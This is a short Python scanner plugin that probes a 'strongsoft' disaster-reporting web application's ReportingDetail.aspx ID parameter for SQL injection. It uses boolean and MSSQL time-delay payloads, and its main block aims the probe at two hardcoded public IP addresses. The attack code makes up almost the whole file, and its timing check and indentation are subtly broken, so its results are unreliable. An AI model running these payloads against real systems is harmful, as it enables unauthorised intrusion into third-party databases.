#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0146463
import re
import time

def assign(service, arg):
    if service == "strongsoft":
        return True, arg
        
        
        
def audit(arg): 
    payload = 'Disaster/Reporting/ReportingDetail.aspx?ID=1'
    getdata1 = '%27%20or%20%271%27%3D%271'
    getdata2 = '%27%20or%20%271%27%3D%272'
    code1, head,res1, errcode, _ = curl.curl2(arg+ payload +getdata1)
    code2, head,res2, errcode, _ = curl.curl2(arg+ payload +getdata2)
    m1 = re.findall('&nbsp',res1)
    m2 = re.findall('&nbsp',res2)
    if code1 == 200 and code2 == 200 and m1!=m2:
        security_hole(arg+payload + "   :sql Injection")
        return
    else:
        getdata1 = '%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
        getdata2 = getdata1.replace('5','0')
        t1 = time.time()
    code1, head, res1, errcode1, _ = curl.curl2(arg+payload+getdata1)
    t2 = time.time()
    code2, head, res2, errcode2, _ = curl.curl2(arg+payload+getdata2)
    t3 = time.time()
    if 2*t2+t1-t3>3:    
        security_hole(arg+payload + "  :found sql Injection")


if __name__ == '__main__': 
    from dummy import * 
    audit(assign('strongsoft', 'http://61.153.79.222:3050/')[1])
    audit(assign('strongsoft', 'http://183.129.136.54:3050/')[1])